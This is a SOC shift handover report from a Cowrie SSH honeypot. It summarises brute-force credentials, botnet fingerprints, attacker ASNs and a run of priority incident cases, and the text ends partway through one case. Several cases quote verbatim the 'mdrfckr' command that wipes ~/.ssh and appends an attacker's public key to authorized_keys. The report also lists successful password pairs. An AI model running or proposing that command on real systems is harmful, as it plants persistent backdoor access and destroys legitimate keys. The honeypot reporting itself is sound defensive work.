# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-09 |
| **Generated At** | 2026-06-09T23:19:57Z |
| **Shift Time** | 23:19 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **471** |
| Confirmed Threats | **442** |
| False Positives Filtered | **29** (6.2%) |
| Unique Attacker IPs | **23** |
| Countries of Origin | **11** |
| High Severity Cases | **47** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **424** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **128** |
| Unique Credential Pairs | **86** |
| Unique Usernames | **57** |
| Unique Passwords | **77** |
| Successful Auth Pairs | **28** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 47 |
| `345gs5662d34` | 22 |
| `ubuntu` | 4 |
| `ftpuser` | 2 |
| `user` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 22 |
| `3245gs5662d34` | 22 |
| `123456` | 6 |
| `123` | 4 |
| `qwerty` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 22 |
| `root` | `3245gs5662d34` | 22 |
| `root` | `password8888` | 1 |
| `root` | `QWERqwer1234` | 1 |
| `root` | `Abc@2026` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `password8888` | `144.79.133.50` | 2026-06-09T21:51:50 |
| `root` | `3245gs5662d34` | `144.79.133.50` | 2026-06-09T21:51:52 |
| `root` | `QWERqwer1234` | `144.79.133.50` | 2026-06-09T21:53:55 |
| `root` | `Abc@2026` | `144.79.133.50` | 2026-06-09T21:56:09 |
| `root` | `24682468` | `107.172.250.235` | 2026-06-09T22:08:23 |
| `root` | `3245gs5662d34` | `107.172.250.235` | 2026-06-09T22:08:28 |
| `root` | `hello@123` | `107.172.250.235` | 2026-06-09T22:10:07 |
| `root` | `Abc#2023` | `107.172.250.235` | 2026-06-09T22:11:46 |
| `root` | `rafael` | `144.79.133.50` | 2026-06-09T22:12:53 |
| `root` | `P@ssword123` | `107.172.250.235` | 2026-06-09T22:13:36 |
| `root` | `asdasd12` | `107.172.250.235` | 2026-06-09T22:21:47 |
| `root` | `Asdf2024` | `144.79.133.50` | 2026-06-09T22:23:30 |
| `root` | `Administrador` | `107.172.250.235` | 2026-06-09T22:26:39 |
| `root` | `!@#qwe123QWE` | `107.172.250.235` | 2026-06-09T22:29:59 |
| `root` | `passw0rd@` | `107.172.250.235` | 2026-06-09T22:33:16 |
| `root` | `Gg123456.` | `107.172.250.235` | 2026-06-09T22:34:56 |
| `root` | `Admin2023*` | `107.172.250.235` | 2026-06-09T22:36:30 |
| `root` | `qazwsx123...` | `144.79.133.50` | 2026-06-09T22:37:55 |
| `root` | `1qazXSW@123` | `107.172.250.235` | 2026-06-09T22:43:03 |
| `root` | `Pass` | `107.172.250.235` | 2026-06-09T22:44:39 |
| `root` | `Server2024!` | `144.79.133.50` | 2026-06-09T22:46:23 |
| `root` | `Qwerty11` | `144.79.133.50` | 2026-06-09T22:50:26 |
| `root` | `Admin@4321` | `152.200.181.42` | 2026-06-09T22:54:24 |
| `root` | `﻿------fuck------` | `116.181.19.113` | 2026-06-09T22:58:00 |
| `root` | `1q2w3e4r!@` | `152.200.181.42` | 2026-06-09T22:58:58 |
| `root` | `Comtom@2025` | `152.200.181.42` | 2026-06-09T23:03:28 |
| `root` | `3245gs5662d34` | `152.200.181.42` | 2026-06-09T23:03:59 |
| `root` | `123456mm` | `152.200.181.42` | 2026-06-09T23:07:55 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **471** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 124 |
| OpenSSH | 2 |
| Unknown | 1 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 124 | 4 |
| `acaa53e0a7d7...` | Mirai/variant | 2 | 2 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 124 | 4 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 2 | 2 | Mirai/variant |
| `95420f9d932d...` | Unknown | 1 | 1 | — |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 21 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `107.172.250.235`, `144.79.133.50`, `152.200.181.42`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **23** |
| Unique ASNs | **17** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS21859` | Zenlayer Inc | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 2 | LOW |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS132199` | Globe Telecom Inc. | 1 | HIGH |
| `AS61663` | INFOLINE BANDA LARGA | 1 | HIGH |
| `AS133119` | China Unicom IP network | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (47)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a953620890d2

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-09 21:51 |
| **Last Seen** | 2026-06-09 21:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 21:51:49` | `cowrie.session.connect` |
| `2026-06-09 21:51:49` | `cowrie.client.version` |
| `2026-06-09 21:51:49` | `cowrie.client.kex` |
| `2026-06-09 21:51:50` | `cowrie.login.success` |
| `2026-06-09 21:51:50` | `cowrie.session.params` |
| `2026-06-09 21:51:50` | `cowrie.command.input` |
| `2026-06-09 21:51:50` | `cowrie.command.failed` |
| `2026-06-09 21:51:50` | `cowrie.log.closed` |
| `2026-06-09 21:51:50` | `cowrie.session.params` |
| `2026-06-09 21:51:50` | `cowrie.command.input` |
| `2026-06-09 21:51:50` | `cowrie.session.file_download` |
| `2026-06-09 21:51:50` | `cowrie.log.closed` |
| `2026-06-09 21:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf5274d735af

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-09 21:51 |
| **Last Seen** | 2026-06-09 21:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 21:51:51` | `cowrie.session.connect` |
| `2026-06-09 21:51:51` | `cowrie.client.version` |
| `2026-06-09 21:51:51` | `cowrie.client.kex` |
| `2026-06-09 21:51:52` | `cowrie.login.success` |
| `2026-06-09 21:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db898a9a2624

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-09 21:53 |
| **Last Seen** | 2026-06-09 21:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 21:53:55` | `cowrie.session.connect` |
| `2026-06-09 21:53:55` | `cowrie.client.version` |
| `2026-06-09 21:53:55` | `cowrie.client.kex` |
| `2026-06-09 21:53:55` | `cowrie.login.success` |
| `2026-06-09 21:53:56` | `cowrie.session.params` |
| `2026-06-09 21:53:56` | `cowrie.command.input` |
| `2026-06-09 21:53:56` | `cowrie.command.failed` |
| `2026-06-09 21:53:56` | `cowrie.log.closed` |
| `2026-06-09 21:53:56` | `cowrie.session.params` |
| `2026-06-09 21:53:56` | `cowrie.command.input` |
| `2026-06-09 21:53:56` | `cowrie.session.file_download` |
| `2026-06-09 21:53:56` | `cowrie.log.closed` |
| `2026-06-09 21:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7515b3fe2279

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-09 21:53 |
| **Last Seen** | 2026-06-09 21:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 21:53:57` | `cowrie.session.connect` |
| `2026-06-09 21:53:57` | `cowrie.client.version` |
| `2026-06-09 21:53:57` | `cowrie.client.kex` |
| `2026-06-09 21:53:57` | `cowrie.login.success` |
| `2026-06-09 21:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6fcdaf9c2b2

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-09 21:56 |
| **Last Seen** | 2026-06-09 21:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 21:56:08` | `cowrie.session.connect` |
| `2026-06-09 21:56:08` | `cowrie.client.version` |
| `2026-06-09 21:56:08` | `cowrie.client.kex` |
| `2026-06-09 21:56:09` | `cowrie.login.success` |
| `2026-06-09 21:56:09` | `cowrie.session.params` |
| `2026-06-09 21:56:09` | `cowrie.command.input` |
| `2026-06-09 21:56:09` | `cowrie.command.failed` |
| `2026-06-09 21:56:09` | `cowrie.log.closed` |
| `2026-06-09 21:56:09` | `cowrie.session.params` |
| `2026-06-09 21:56:09` | `cowrie.command.input` |
| `2026-06-09 21:56:09` | `cowrie.session.file_download` |
| `2026-06-09 21:56:09` | `cowrie.log.closed` |
| `2026-06-09 21:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e07fddac5c4

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-09 21:56 |
| **Last Seen** | 2026-06-09 21:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 21:56:10` | `cowrie.session.connect` |
| `2026-06-09 21:56:10` | `cowrie.client.version` |
| `2026-06-09 21:56:10` | `cowrie.client.kex` |
| `2026-06-09 21:56:10` | `cowrie.login.success` |
| `2026-06-09 21:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bf58ecb2815

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:08 |
| **Last Seen** | 2026-06-09 22:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:08:22` | `cowrie.session.connect` |
| `2026-06-09 22:08:22` | `cowrie.client.version` |
| `2026-06-09 22:08:22` | `cowrie.client.kex` |
| `2026-06-09 22:08:23` | `cowrie.login.success` |
| `2026-06-09 22:08:23` | `cowrie.session.params` |
| `2026-06-09 22:08:23` | `cowrie.command.input` |
| `2026-06-09 22:08:23` | `cowrie.command.failed` |
| `2026-06-09 22:08:24` | `cowrie.log.closed` |
| `2026-06-09 22:08:24` | `cowrie.session.params` |
| `2026-06-09 22:08:24` | `cowrie.command.input` |
| `2026-06-09 22:08:24` | `cowrie.session.file_download` |
| `2026-06-09 22:08:24` | `cowrie.log.closed` |
| `2026-06-09 22:08:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5857e4091d0e

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:08 |
| **Last Seen** | 2026-06-09 22:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:08:27` | `cowrie.session.connect` |
| `2026-06-09 22:08:27` | `cowrie.client.version` |
| `2026-06-09 22:08:27` | `cowrie.client.kex` |
| `2026-06-09 22:08:28` | `cowrie.login.success` |
| `2026-06-09 22:08:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bae662829cb9

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:10 |
| **Last Seen** | 2026-06-09 22:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:10:06` | `cowrie.session.connect` |
| `2026-06-09 22:10:06` | `cowrie.client.version` |
| `2026-06-09 22:10:06` | `cowrie.client.kex` |
| `2026-06-09 22:10:07` | `cowrie.login.success` |
| `2026-06-09 22:10:08` | `cowrie.session.params` |
| `2026-06-09 22:10:08` | `cowrie.command.input` |
| `2026-06-09 22:10:08` | `cowrie.command.failed` |
| `2026-06-09 22:10:08` | `cowrie.log.closed` |
| `2026-06-09 22:10:08` | `cowrie.session.params` |
| `2026-06-09 22:10:08` | `cowrie.command.input` |
| `2026-06-09 22:10:09` | `cowrie.session.file_download` |
| `2026-06-09 22:10:09` | `cowrie.log.closed` |
| `2026-06-09 22:10:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa88a796c1ac

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:10 |
| **Last Seen** | 2026-06-09 22:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:10:11` | `cowrie.session.connect` |
| `2026-06-09 22:10:11` | `cowrie.client.version` |
| `2026-06-09 22:10:12` | `cowrie.client.kex` |
| `2026-06-09 22:10:12` | `cowrie.login.success` |
| `2026-06-09 22:10:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3938b0e0bbd

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:11 |
| **Last Seen** | 2026-06-09 22:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:11:45` | `cowrie.session.connect` |
| `2026-06-09 22:11:45` | `cowrie.client.version` |
| `2026-06-09 22:11:45` | `cowrie.client.kex` |
| `2026-06-09 22:11:46` | `cowrie.login.success` |
| `2026-06-09 22:11:47` | `cowrie.session.params` |
| `2026-06-09 22:11:47` | `cowrie.command.input` |
| `2026-06-09 22:11:47` | `cowrie.command.failed` |
| `2026-06-09 22:11:47` | `cowrie.log.closed` |
| `2026-06-09 22:11:47` | `cowrie.session.params` |
| `2026-06-09 22:11:47` | `cowrie.command.input` |
| `2026-06-09 22:11:48` | `cowrie.session.file_download` |
| `2026-06-09 22:11:48` | `cowrie.log.closed` |
| `2026-06-09 22:11:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab79b49494da

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:11 |
| **Last Seen** | 2026-06-09 22:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:11:50` | `cowrie.session.connect` |
| `2026-06-09 22:11:50` | `cowrie.client.version` |
| `2026-06-09 22:11:51` | `cowrie.client.kex` |
| `2026-06-09 22:11:52` | `cowrie.login.success` |
| `2026-06-09 22:11:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1178e3c73584

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-09 22:12 |
| **Last Seen** | 2026-06-09 22:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
